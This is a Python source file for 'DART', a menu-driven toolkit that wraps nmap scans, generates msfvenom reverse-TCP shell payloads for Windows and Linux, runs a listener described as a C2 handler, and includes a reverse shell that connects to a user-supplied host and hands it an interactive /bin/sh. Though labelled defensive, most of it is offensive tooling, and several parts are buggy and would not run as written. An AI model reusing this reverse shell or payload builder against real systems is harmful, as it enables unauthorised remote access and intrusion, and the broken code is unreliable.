import os
import nmap 
import socket
import platform
from colorama import Fore
from http.server import BaseHTTPRequestHandler, HTTPServer
from html import escape
import subprocess


class banner:
    def __init__(self,banner1,banner2,banner3):
        self.banner1 = banner1
        self.banner2 = banner2
        self.banner3  = banner3 
class ip_add:
    def __init__(self,rhost,lhost):
        self.rhost = rhost
        self.lhost = lhost
class menu:
    def __init__(self,main,nmap,):
        self.main = main
        self.nmap = nmap
class shell_stuff:
    def __init__(self,msfv):
        self.msfv = msfv

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        # Send response status code
        self.send_response(200)
        
        # Send headers
        self.send_header("Content-type", "text/html")
        self.end_headers()

        # Write HTML content
        self.wfile.write(bytes("<html><head><title>Secret_Info</title></head>", "utf-8"))
        # Use escape to safely render the request path
        self.wfile.write(bytes("<body><p>Request: %s</p>" % escape(self.path), "utf-8"))
        self.wfile.write(bytes("<p>Passwords are stored on a Dir within this website.</p>", "utf-8"))
        self.wfile.write(bytes("</body></html>", "utf-8"))



menu.nmap = """ 
NMAP Menu 

[1] Simple Scan
[2] Aggresive Scan
[3] Subnet Sweep
[4] Vulunrability Scan
[5] IPV6               
                """

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

menu.main = """

[1] Nmap Interface 
[2] Start Python Http Server 
[3] Shell maker
[4] Shell Handler
[5] Info for nerds
[6] Connect back to a C2
[7] OS Shell (Self)

"""

banner.banner1 = "        Defensive Automation Remote Toolset"
banner.banner2 = "        https://github.com/Richycam"
banner.banner3 =""" 
                                _____  ___  ______ ______
                                |  _  \/ _ \ | ___ \_   _|
                                | | | / /_\ \| |_/ / | |  
                                | | | |  _  ||    /  | |  
                                | |/ /| | | || |\ \  | |  
                                |___/ \_| |_/\_| \_| \_/  
                                                                              
"""

def flow_handler():
    check_value = input  ("\n b to go back to main menu \n DAT> ")
    if check_value == "b":
        clear()



def opt_1():
    clear()
    print(menu.nmap)
    ip_add.rhost = input("IP to scan = ").lower
    nmap_impt = input("DAT> ")
    match nmap_impt:
        case "1":
            clear()
            nmap.PortScanner.command_line("nmap {0}".format(ip_add.rhost))
        case "2":
            clear()
            nmap.PortScanner.command_line("nmap {0} -A".format(ip_add.rhost))
        case "3":
            clear()
            nmap.PortScanner.command_line("nmap {0} /24".format(ip_add.rhost))
        case "4":
            clear()
            nmap.PortScanner.command_line("nmap {0} --script=vuln".format(ip_add.rhost))
        case "5":
            nmap.PortScanner.command_line("nmap {0} -6".format(ip_add.rhost))
        case "b":
            clear()
    flow_handler()

def opt_2():
    hostName = "localhost"
    serverPort = 8080
    if __name__ == "__main__":        
    # Correct initialization of HTTPServer with MyServer handler
        webServer = HTTPServer((hostName, serverPort), MyServer)
        print("Server started http://%s:%s" % (hostName, serverPort))

        try:
            webServer.serve_forever()
        except KeyboardInterrupt:
            pass

        webServer.server_close()
        print("Server stopped.")


def opt_3():
    print("the shell should be created in your home directory \n ")
    ## // WINDOWS
    check_1 = input("Windows or linux? \n DAT> ").lower
    oper_sys_win ="/windows/shell_reverse_tcp/"
    exe_elf_win = "-f exe"
    shell_name_win = "shell.exe"
    ## // LINUX
    x_type = input("x86 or x64? \n DAT> ")
    oper_sys = "/linux/{0}/shell_reverse_tcp/".format(x_type)
    exe_elf = "-f elf"
    shell_name = "shell.elf"
    
    lhost = input("Lhost (Local Host) \n DAT> ")
    
    alltogether_msf_win = ("msfvenom -p {0} {1} {2} > {3}").format(oper_sys_win,lhost,exe_elf_win,shell_name_win)
    alltogether_msf = ("msfvenom -p {0} {1} {2} > {3}").format(oper_sys,lhost,exe_elf,shell_name)
    if check_1 == "windows":
        os.system("sudo",alltogether_msf_win)
    elif check_1 == "linux":
        os.system("sudo",alltogether_msf)
    flow_handler()
    clear()

def opt_4():
    def start_server(host='127.0.0.1', port=65432):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, port))
            s.listen()
            print(f"Server started at LOCALHOST:: {host}:{port}")
            print(" Host Network Details:","\n" )
            os.system('ipconfig' if os.name == 'nt' else 'ifconfig')
            conn, addr = s.accept()
            with conn:
                print(f"Connected by {addr}")
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    print(f"Received command: {data.decode()}")
                    response = f"Executed: {data.decode()}"
                    conn.sendall(response.encode())

    if __name__ == "__main__":
        start_server()

def opt_5():
    print(f"Host :{platform.node()}")
    print(f"proc :{platform.processor()}")
    print(f"arch :{platform.architecture()}")
    print(f"mach :{platform.machine()}")
    print(f"plat :{platform.platform()}")
    print(f"sys :{platform.system()}")
    print(f"uname :{platform.uname()}")
    print(f"PyVer :{platform.python_version()}")
    flow_handler()

def opt_6():
    host = input("Hostname to connect \n DART>")
    port = input ("port \n DART>")
    int(port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])

def opt_7():
    clear()
    run = True
    while run:
        print("Interact with your OS shell type b to go back \n")
        
        cmdline = input("\nDART> ")
        chk = os.system(cmdline)
        if chk == "b":
            run = False



def main():
    clear()


    cntrl_main = True
    while cntrl_main:
        clear()
        print(Fore.GREEN + banner.banner3)
        print(Fore.GREEN +banner.banner1)
        print(Fore.RED + banner.banner2)
        print(Fore.RESET)
        print(f"Host: {platform.node()}") 
        print(platform.system())
        print("Windows is not Reccmmended"if os.name== "nt" else"")

        print(menu.main)
        
        choose = input("DART>")
        clear()
        

        match choose: 
            case "1":
                opt_1() #Nmap interface
                continue
            case "2":
                opt_2() #Python Server
                continue
            case "3":
                opt_3() #Shell creator
                continue
            case "4":
                opt_4() #C2 start
                continue
            case "5":
                opt_5() # Nerdy stuff
                continue
            case "6":
                opt_6()
            case "7":
                opt_7()



main()
